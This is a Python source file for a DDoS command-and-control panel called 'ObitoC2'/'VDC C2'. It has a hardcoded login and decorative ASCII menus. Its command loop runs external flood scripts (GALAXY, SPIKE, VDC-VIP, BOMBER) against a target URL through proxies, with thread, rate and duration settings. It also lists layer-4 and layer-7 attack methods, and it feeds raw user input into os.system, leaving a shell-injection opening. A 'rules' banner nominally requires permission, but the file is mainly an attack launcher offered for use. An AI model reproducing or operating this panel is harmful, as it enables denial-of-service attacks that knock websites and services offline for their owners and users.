from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
import socket
import os
import requests
import random
import getpass
import time
import sys

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxye.txt').readlines()
bots = len(proxys)

def loading():
    clear()
    print(f'''
\x1b[38;5;160m        ░VVVVVVVV           VVVVVVVV     DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC 222222222222222    
V::::::V           V::::::V     D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2:::::::::::::::22  
V::::::V           V::::::V     D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::222222:::::2 
V::::::V           V::::::V     DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2222222     2:::::2 
 V:::::V           V:::::V        D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC            2:::::2 
  V:::::V         V:::::V         D:::::D     D:::::D     C:::::C                   C:::::C                          2:::::2 
   V:::::V       V:::::V          D:::::D     D:::::D     C:::::C                   C:::::C                       2222::::2  
    V:::::V     V:::::V           D:::::D     D:::::D     C:::::C                   C:::::C                  22222::::::22   
     V:::::V   V:::::V            D:::::D     D:::::D     C:::::C                   C:::::C                22::::::::222     
      V:::::V V:::::V             D:::::D     D:::::D     C:::::C                   C:::::C               2:::::22222        
       V:::::V:::::V              D:::::D     D:::::D     C:::::C                   C:::::C              2:::::2             
        V:::::::::V               D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC2:::::2             
         V:::::::V              DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2:::::2       222222
          V:::::V               D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::2222222:::::2
           V:::V                D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2::::::::::::::::::2
            VVV                 DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC22222222222222222222
    ''')
    time.sleep(1)

def si():
    print('         \x1b[38;5;160m[ \x1b[38;2;233;233;233mObitoC2 \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to ObitoC2! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: Xylent & Oyen\x1b[38;5;160m| \x1b[38;2;233;233;233mObitoC2')
    print("")

def rules():
    clear()
    si()
    print(f'''
\x1b[38;5;160m             VVVVVVVV           VVVVVVVV     DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC 222222222222222    
V::::::V           V::::::V     D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2:::::::::::::::22  
V::::::V           V::::::V     D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::222222:::::2 
V::::::V           V::::::V     DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2222222     2:::::2 
 V:::::V           V:::::V        D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC            2:::::2 
  V:::::V         V:::::V         D:::::D     D:::::D     C:::::C                   C:::::C                          2:::::2 
   V:::::V       V:::::V          D:::::D     D:::::D     C:::::C                   C:::::C                       2222::::2  
    V:::::V     V:::::V           D:::::D     D:::::D     C:::::C                   C:::::C                  22222::::::22   
     V:::::V   V:::::V            D:::::D     D:::::D     C:::::C                   C:::::C                22::::::::222     
      V:::::V V:::::V             D:::::D     D:::::D     C:::::C                   C:::::C               2:::::22222        
       V:::::V:::::V              D:::::D     D:::::D     C:::::C                   C:::::C              2:::::2             
        V:::::::::V               D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC2:::::2             
         V:::::::V              DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2:::::2       222222
          V:::::V               D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::2222222:::::2
           V:::V                D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2::::::::::::::::::2
            VVV                 DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC22222222222222222222
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
\x1b[38;5;160m           VVVVVVVV           VVVVVVVV     DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC 222222222222222    
V::::::V           V::::::V     D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2:::::::::::::::22  
V::::::V           V::::::V     D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::222222:::::2 
V::::::V           V::::::V     DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2222222     2:::::2 
 V:::::V           V:::::V        D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC            2:::::2 
  V:::::V         V:::::V         D:::::D     D:::::D     C:::::C                   C:::::C                          2:::::2 
   V:::::V       V:::::V          D:::::D     D:::::D     C:::::C                   C:::::C                       2222::::2  
    V:::::V     V:::::V           D:::::D     D:::::D     C:::::C                   C:::::C                  22222::::::22   
     V:::::V   V:::::V            D:::::D     D:::::D     C:::::C                   C:::::C                22::::::::222     
      V:::::V V:::::V             D:::::D     D:::::D     C:::::C                   C:::::C               2:::::22222        
       V:::::V:::::V              D:::::D     D:::::D     C:::::C                   C:::::C              2:::::2             
        V:::::::::V               D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC2:::::2             
         V:::::::V              DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2:::::2       222222
          V:::::V               D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::2222222:::::2
           V:::V                D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2::::::::::::::::::2
            VVV                 DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC22222222222222222222
                               \x1b[38;5;160m╔═══════════════╗
                               \x1b[38;5;160m║    \x1b[38;5;160mLayer 4    \x1b[38;5;160m║
               \x1b[38;5;160m╔═══════════════╩═══════════════╩═════════════╗
               \x1b[38;5;160m║   \x1b[38;5;160mUDP          \x1b[38;5;160m║   \x1b[38;5;160mBROWSER           \x1b[38;5;160m║
               \x1b[38;5;160m╚═════════════════════════════════════════════╝
               
               \x1b[255;255;0m            ===> UPDATE METHODS ? :)     
               ''')
               
def layer7():
    clear()
    si()
    print(f'''
\x1b[38;5;160m           VVVVVVVV           VVVVVVVV     DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC 222222222222222    
V::::::V           V::::::V     D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2:::::::::::::::22  
V::::::V           V::::::V     D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::222222:::::2 
V::::::V           V::::::V     DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2222222     2:::::2 
 V:::::V           V:::::V        D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC            2:::::2 
  V:::::V         V:::::V         D:::::D     D:::::D     C:::::C                   C:::::C                          2:::::2 
   V:::::V       V:::::V          D:::::D     D:::::D     C:::::C                   C:::::C                       2222::::2  
    V:::::V     V:::::V           D:::::D     D:::::D     C:::::C                   C:::::C                  22222::::::22   
     V:::::V   V:::::V            D:::::D     D:::::D     C:::::C                   C:::::C                22::::::::222     
      V:::::V V:::::V             D:::::D     D:::::D     C:::::C                   C:::::C               2:::::22222        
       V:::::V:::::V              D:::::D     D:::::D     C:::::C                   C:::::C              2:::::2             
        V:::::::::V               D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC2:::::2             
         V:::::::V              DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2:::::2       222222
          V:::::V               D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::2222222:::::2
           V:::V                D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2::::::::::::::::::2
            VVV                 DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC22222222222222222222
                               \x1b[38;5;160m╔═══════════════╗
                               \x1b[38;5;160m║    \x1b[38;5;160mLayer 7    \x1b[38;5;160m║
               \x1b[38;5;160m╔═══════════════╩═══════════════╩═════════════╗
               \x1b[38;5;160m║   \x1b[38;5;160mTLS          \x1b[38;5;160m║   \x1b[38;5;160mGALAXY          \x1b[38;5;160m║
               \x1b[38;5;160m║   \x1b[38;5;160mTLZ          \x1b[38;5;160m║   \x1b[38;5;160mSPIKE          \x1b[38;5;160m║
               \x1b[38;5;160m╚═════════════════════════════════════════════╝
               
               \x1b[255;255;0m            ===> UPDATE METHODS ? :)     
               ''')

def menu():
    sys.stdout.write(f"         \x1b]2;ObitoC2 | USERS Admin\x07")
    clear()
    print('\x1b[38;5;160m[ \x1b[38;2;233;233;233mObitoC2 \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to ObitoC2! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: Xylent & Oyen \x1b[38;5;160m| \x1b[38;2;233;233;233mObitoC2')
    print("")
    print("""
\x1b[38;5;160m       VVVVVVVV           VVVVVVVV     DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC 222222222222222    
V::::::V           V::::::V     D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2:::::::::::::::22  
V::::::V           V::::::V     D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::222222:::::2 
V::::::V           V::::::V     DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2222222     2:::::2 
 V:::::V           V:::::V        D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC            2:::::2 
  V:::::V         V:::::V         D:::::D     D:::::D     C:::::C                   C:::::C                          2:::::2 
   V:::::V       V:::::V          D:::::D     D:::::D     C:::::C                   C:::::C                       2222::::2  
    V:::::V     V:::::V           D:::::D     D:::::D     C:::::C                   C:::::C                  22222::::::22   
     V:::::V   V:::::V            D:::::D     D:::::D     C:::::C                   C:::::C                22::::::::222     
      V:::::V V:::::V             D:::::D     D:::::D     C:::::C                   C:::::C               2:::::22222        
       V:::::V:::::V              D:::::D     D:::::D     C:::::C                   C:::::C              2:::::2             
        V:::::::::V               D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC2:::::2             
         V:::::::V              DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2:::::2       222222
          V:::::V               D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::2222222:::::2
           V:::V                D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2::::::::::::::::::2
            VVV                 DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC22222222222222222222

\x1b[0m               🅃🅈🄿🄴 🄼🄴🅃🄷🄾🄳 🅃🄾 🄶🄴🅃 🄻🄸🅂🅃 🄼🄴🅃🄷🄾🄳 VDC C2

      
""")


def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;5;160m╔══[Root\x1b[\x1b[38;5;160m@Ob\x1b[38;5;160mi\x1b[38;5;160mtoC2\x1b[38;5;160m]
\x1b[38;5;160m╚\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m➤ \x1b[38;5;160m''')
        if cnc == "methods" or cnc == "METHODS" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        if cnc == "method" or cnc == "METHOD" or cnc == "L4" or cnc == "l4":
            layer4()
#Method
                
        elif "GALAXY" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node GALAXY.js {url} {time}')
            except IndexError:
                print('Usage: GALAXY <url> <time>')
                print('Example: GALAXY http://example.com 100')   
        
        elif "SPIKE" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node spike.js {url} {threads} {time}')
            except IndexError:
                print('Usage: SPIKE <url> <threads> <time>')
                print('Example: SPIKE http://example.com 1000 100')
                
        elif "VDC-VIP" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node obito-vip.js {target} {time} {Rate} {threads} {proxyFile}')
            except IndexError:
                print('Usage: VDC-VIP <target> <time> <Rate> <threads> <proxyFile>')
                print('Example: VDC-VIP http://example.com 100 100 1000 proxy.txt')
                
        elif "BOMBER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rpi = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node BOOMBER.js {url} {time} {rpi} {thread}')
            except IndexError:
                print('Usage: BOMBER <url> <time> <rpi> <threads>')
                print('Example: BOMBER http://example.com 100 64 1000')   
                
        elif "help" in cnc:
            print(f'''
\x1b[38;5;160m            ░VVVVVVVV           VVVVVVVV     DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC 222222222222222    
V::::::V           V::::::V     D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2:::::::::::::::22  
V::::::V           V::::::V     D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::222222:::::2 
V::::::V           V::::::V     DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2222222     2:::::2 
 V:::::V           V:::::V        D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC            2:::::2 
  V:::::V         V:::::V         D:::::D     D:::::D     C:::::C                   C:::::C                          2:::::2 
   V:::::V       V:::::V          D:::::D     D:::::D     C:::::C                   C:::::C                       2222::::2  
    V:::::V     V:::::V           D:::::D     D:::::D     C:::::C                   C:::::C                  22222::::::22   
     V:::::V   V:::::V            D:::::D     D:::::D     C:::::C                   C:::::C                22::::::::222     
      V:::::V V:::::V             D:::::D     D:::::D     C:::::C                   C:::::C               2:::::22222        
       V:::::V:::::V              D:::::D     D:::::D     C:::::C                   C:::::C              2:::::2             
        V:::::::::V               D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC2:::::2             
         V:::::::V              DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2:::::2       222222
          V:::::V               D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::2222222:::::2
           V:::V                D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2::::::::::::::::::2
            VVV                 DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC22222222222222222222

                      \x1b[38;5;160m╔══════════════════════════════╗
                       METHODS  ► SHOW LAYER7 METHODS
                       METHOD ► SHOW LAYER4 METHOD
                       BANNERS ► SHOW BANNERS
                       RULES   ► RULES PANEL
                       PORTS   ► SHOW ALL PORTS
                       TOOLS   ► SHOW TOOLS
                       CLEAR   ► CLEAR TERMINAL
                      \x1b[38;5;160m╚══════════════════════════════╝
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("\x1b[38;5;160mCommand: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                     
def login():
    clear()
    user = "DDOS"
    passwd = "VIP"
    print("\x1b[38;5;160m     Welcome To VDC2")
    print("\x1b[38;5;160m        Please Login")
    time.sleep(1)
    clear()
    print("""VVVVVVVV           VVVVVVVV     DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC 222222222222222    
V::::::V           V::::::V     D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2:::::::::::::::22  
V::::::V           V::::::V     D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::222222:::::2 
V::::::V           V::::::V     DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2222222     2:::::2 
 V:::::V           V:::::V        D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC            2:::::2 
  V:::::V         V:::::V         D:::::D     D:::::D     C:::::C                   C:::::C                          2:::::2 
   V:::::V       V:::::V          D:::::D     D:::::D     C:::::C                   C:::::C                       2222::::2  
    V:::::V     V:::::V           D:::::D     D:::::D     C:::::C                   C:::::C                  22222::::::22   
     V:::::V   V:::::V            D:::::D     D:::::D     C:::::C                   C:::::C                22::::::::222     
      V:::::V V:::::V             D:::::D     D:::::D     C:::::C                   C:::::C               2:::::22222        
       V:::::V:::::V              D:::::D     D:::::D     C:::::C                   C:::::C              2:::::2             
        V:::::::::V               D:::::D    D:::::D       C:::::C       CCCCCC      C:::::C       CCCCCC2:::::2             
         V:::::::V              DDD:::::DDDDD:::::D         C:::::CCCCCCCC::::C       C:::::CCCCCCCC::::C2:::::2       222222
          V:::::V               D:::::::::::::::DD           CC:::::::::::::::C        CC:::::::::::::::C2::::::2222222:::::2
           V:::V                D::::::::::::DDD               CCC::::::::::::C          CCC::::::::::::C2::::::::::::::::::2
            VVV                 DDDDDDDDDDDDD                     CCCCCCCCCCCCC             CCCCCCCCCCCCC22222222222222222222
\x1b[0m               Welcome To VDC C2 Channel @VDCOMUNITY

""")
    username = input("\x1b[38;5;160m              </> Username:")
    password = getpass.getpass(prompt='\x1b[38;5;160m              </> Password:')
    if username != user or password != passwd:
        print("")
        print("\x1b[38;5;160m              </> Invalid?...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("\x1b[38;5;160m              </> Welcome to VDCC2!")
        time.sleep(0.3)
        loading()
        main()

login()


